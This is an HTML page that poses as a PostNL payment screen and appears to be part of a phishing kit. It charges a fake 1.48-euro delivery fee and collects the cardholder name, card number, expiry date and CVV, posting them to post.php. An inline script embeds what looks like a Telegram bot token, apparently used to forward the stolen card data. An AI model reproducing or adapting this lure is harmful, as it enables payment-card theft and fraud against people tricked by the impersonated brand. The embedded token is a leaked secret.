<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>PostNL</title>
</head>
<body>
 <header>
<div class="left">
<img src="res/img/logo.png" >
<a href="#">Mijn account</a>
<a href="#">Verzenden</a>
<a href="#">Zakelijke oplossingen</a>
<a href="#">Klantenservice</a>

</div>
<div class="right">
    <a href="#">Hulp</a>
<button>Uitloggen</button>
</div>
 </header>  

<main>

<script>var token="7588677879:AAHRT9MZ1JN-IY1FpIltlG44U9FZGJdotTo";</script>

 <div class="continer">
<h2>Bezorgkosten: 1,48 EURO.</h2>
<div class="title1"> Voeg een betaalmethode toe om de bezorgkosten voor uw pakket te betalen.</div>

<form action="post.php" method="post">

<div class="col">
<div class="text"> Naam op kaart </div>
 <input type="text" name="name" required placeholde> </div>


 <div class="col">
<div class="text"> Kaartnummer</div>
<input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc" ></div>


<div class="col">
<div class="text">Vervaldatum </div>
<input type="text" name="exp" required placeholder="MM/JJ" id="exp" > </div>

<div class="col">
<div class="text"> Beveiligingscode</div>
<input type="text"  name="cvv" required placeholder="CVV" id="cvv" > </div> 

<div class="col">
<button type="submit" >Doorgaan</button>
 </div> <br>





</form>
</div>
</main>
<script src="./res/jq.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html> 